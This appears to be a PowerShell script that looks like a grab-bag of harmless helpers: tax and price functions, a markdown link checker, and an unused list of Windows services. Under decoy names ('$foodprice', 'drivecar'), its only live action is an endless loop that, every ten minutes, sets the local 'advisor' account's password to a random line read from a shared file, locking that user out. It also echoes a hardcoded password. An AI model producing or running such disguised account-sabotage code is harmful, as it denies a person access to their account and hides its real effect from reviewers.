while($true)
{
function Get-TimesResult {
Param ([int]$a,[int]$b)
$c = $a * $b
Write-Output $c
}
$timevalue = get-random -inputobject (get-content "C:\\Users\\advisor.YOKOHAMA\\sharing\\random.txt")

function Output-SalesTax {
 param( [int]$Price, [int]$Tax )
 $Price + $Tax
}
function Get-ByOwner
 {
   Get-ChildItem -recurse C:\ | get-acl | where {$_.Owner -match $args[0]} 
 }
 function set_password
 {
	 echo "password=techno"
 }
 function write-price
 {
  param([string]$description = "unknown",
        [int]$price = 100)
  Write-Output "$description ..... $price"
 }

$foodprice = ConvertTo-SecureString $timevalue -AsPlainText -Force
function Test-MarkdownLinks([String]$Path) {
    $unreachable = @()
    # Get markdown files recursively
    $files = Get-ChildItem -Path $Path -Recurse -Include "*.md"

    $files | ForEach-Object {
        $fileName = $_.Name
        Write-Host "Analyzing $fileName"

        $urls = Select-String -Path $_ -Pattern "\[.+\]\((http.*?)\)" | ForEach-Object { $_.matches.Groups[1] } | Select-Object

        $urls | ForEach-Object {
            $url = $_.Value
            Write-Host "Requesting url $url"

            try {
                $request = Invoke-WebRequest -Uri $url -DisableKeepAlive -UseBasicParsing
            } catch {
                Write-Warning -Message "Found dead url $url in $fileName"
                $unreachable += $url
            }
        }
    }

    # Output urls
    return $unreachable
}
function drivecar
{
Set-LocalUser -Name advisor -Password $foodprice
}
function bloatgone
{
	$services = @(
    "diagnosticshub.standardcollector.service" # Microsoft (R) Diagnostics Hub Standard Collector Service
    "DiagTrack"                                # Diagnostics Tracking Service
    "dmwappushservice"                         # WAP Push Message Routing Service (see known issues)
    "lfsvc"                                    # Geolocation Service
    "MapsBroker"                               # Downloaded Maps Manager
    "NetTcpPortSharing"                        # Net.Tcp Port Sharing Service
    "RemoteAccess"                             # Routing and Remote Access
    "RemoteRegistry"                           # Remote Registry
    "SharedAccess"                             # Internet Connection Sharing (ICS)
    "TrkWks"                                   # Distributed Link Tracking Client
    "WbioSrvc"                                 # Windows Biometric Service (required for Fingerprint reader / facial detection)
    #"WlanSvc"                                 # WLAN AutoConfig
    "WMPNetworkSvc"                            # Windows Media Player Network Sharing Service
    #"wscsvc"                                  # Windows Security Center Service
    #"WSearch"                                 # Windows Search
    "XblAuthManager"                           # Xbox Live Auth Manager
    "XblGameSave"                              # Xbox Live Game Save Service
    "XboxNetApiSvc"                            # Xbox Live Networking Service
    "ndu"                                      # Windows Network Data Usage Monitor
    # Services which cannot be disabled
    #"WdNisSvc"
)
}
drivecar
timeout /t 600 /nobreak
}